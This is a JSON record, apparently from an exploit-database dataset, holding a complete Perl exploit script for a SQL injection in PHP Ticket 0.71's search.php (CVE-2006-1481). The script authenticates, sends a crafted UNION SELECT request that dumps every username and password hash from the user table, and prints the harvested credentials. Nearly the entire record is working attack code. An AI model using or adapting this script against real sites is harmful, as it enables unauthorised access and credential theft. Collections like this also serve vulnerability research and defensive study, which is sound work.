{
  "id": "1609",
  "title": "PHP Ticket 0.71 - &#039;search.php&#039; SQL Injection",
  "cve": "CVE-2006-1481",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n###############################################################################\r\n#Copyright (C) undefined1_\r\n#\r\n#This program is free software; you can redistribute it and/or\r\n#modify it under the terms of the GNU General Public License\r\n#as published by the Free Software Foundation; either version 2\r\n#of the License, or (at your option) any later version.\r\n#\r\n#This program is distributed in the hope that it will be useful,\r\n#but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n#GNU General Public License for more details.\r\n#\r\n#You should have received a copy of the GNU General Public License\r\n#along with this program; if not, write to the Free Software\r\n#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\r\n#\r\n###############################################################################\r\n\r\nuse strict; \r\nuse IO::Socket;\r\n\r\n$| = 1;\r\nprintf \":: php ticket <= 0.71 exploit (privilege escalation) - by undefined1_ @ bash-x.net/undef/ ::\\n\\n\\n\";\r\n\r\n\r\nmy $website = shift || usage();\r\nmy $user = shift || usage();\r\nmy $password = shift || usage();\r\n\r\nmy $path = \"/\";\r\nmy $site = $website;\r\nif(index($website, \"/\") != -1)\r\n{\r\n\tmy $index = index($website, \"/\");\r\n\t$path = substr($website, $index);\r\n\t$site = substr($website, 0, $index);\r\n\tif(substr($path, length($path)-1) ne \"/\")\r\n\t{\r\n\t\t$path .= \"/\";\r\n\t}\r\n}\r\n\r\n\r\nmy $eop = \"\\r\\nHost: $site\\r\\n\";\r\n$eop .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n$eop .= \"Connection: close\\r\\n\";\r\n\r\n\r\n\r\nmy $packet1 = \"POST \".$path.\"search.php HTTP/1.1\\r\\n\";\r\nmy $postdata = \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$postdata .= \"Host: $site\\r\\n\";\r\n$postdata .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n$postdata .= \"Connection: close\\r\\n\";\r\n$postdata .= \"Content-Length: 31\\r\\n\";\r\n$postdata .= \"Cookie: PHPSESSID=aeb241ebabb33d5fb5ba756453f725e8\\r\\n\\r\\n\";\r\n$postdata .= \"frm_user=\".$user.\"&frm_passwd=\".$password;\r\nmy $data = sendpacket($site, $packet1.$postdata);\r\n\r\n\r\n\r\nmy $packet2 = \"POST \".$path.\"search.php HTTP/1.1\\r\\n\";\r\n$postdata = \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$postdata .= \"Host: $site\\r\\n\";\r\n$postdata .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n$postdata .= \"Connection: close\\r\\n\";\r\n$postdata .= \"Content-Length: 215\\r\\n\";\r\n$postdata .= \"Cookie: PHPSESSID=aeb241ebabb33d5fb5ba756453f725e8\\r\\n\\r\\n\";\r\n$postdata .= \"frm_query=a&frm_search_in=1%3D0+union+all+select+1%2C1%2C1%2C1%2C1%2C1%2CCONCAT%280x30576e656420%2Cuser%2C0x20%2Cpasswd%29%2C1%2C1%2C1%2C1%2C1%2C1+from+user--&frm_ordertype=date&frm_order_desc=DESC&frm_querytype=%25\";\r\n$data = sendpacket($site, $packet2.$postdata);\r\n\r\n\r\nprint \"password are encrypted with the PASSWORD() function of mysql\\n\\n\";\r\n\r\nprintf(\"username%-20spassword\\n\", \" \");\r\nprintf(\"--------%-20s--------\\n\", \" \");\r\nmy $index = 0;\r\nwhile(($index = index($data,\"0Wned \", $index)) != -1)\r\n{\r\n\t$index += 6;\r\n\tmy $index2 = index($data,\" \", $index);\r\n\tmy $index3 = index($data,\"</A>\", $index2);\r\n\tprintf(\"%s%-20s%s\\n\", substr($data,$index,$index2-$index) , \" \", substr($data,$index2+1,$index3-($index2+1)));\r\n\t$index = $index3+4;\r\n}\r\n\r\n\r\nsub sendpacket(\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $request = shift;\r\n\r\n\tmy $sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $server, PeerPort => \"80\") or die \"[-] Could not connect to $server:80 $!\\n\";\r\n\tprint $sock \"$request\";\r\n\r\n\t\r\n\tmy $data = \"\";\r\n\tmy $answer;\r\n\twhile($answer = <$sock>)\r\n\t{\r\n\t\t$data .= $answer;\r\n\t}\r\n\t\r\n\tclose($sock);\r\n\treturn $data;\r\n}\r\n\r\nsub usage() {\r\n\tprintf \"usage: %s <website> <user> <password>\\n\", $0;\r\n\tprintf \"exemple: %s www.site.com/phpticket/\\n\", $0;\r\n\texit;\r\n}\r\n\r\n# milw0rm.com [2006-03-25]",
  "url": "https://www.exploit-db.com/exploits/1609"
}